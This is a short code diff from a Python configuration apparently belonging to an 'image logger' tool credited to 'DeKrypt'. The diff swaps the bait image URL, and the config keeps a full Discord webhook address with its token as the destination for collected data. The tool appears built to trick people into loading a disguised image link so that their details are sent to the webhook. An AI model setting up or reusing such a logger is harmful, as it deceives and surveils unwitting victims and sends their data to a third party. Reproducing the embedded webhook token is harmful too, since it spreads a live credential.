@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1476897686220181599/K4EUq6sxnn2RJFQ5ZKVCtmqZICKtuHLla0Wa1wlubAbh17gX7RdcIid3UXaHBOo8iHqg",
-    "image": "https://cleaner-and-launderer.com/wp-content/uploads/2024/02/Ways-Websites-Are-Hacked-How-to-Prevent-Them-1.png", # You can also have a custom image by using a URL argument
+    "image": "https://pbs.twimg.com/media/G7iGWTpXYAAgB0E.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
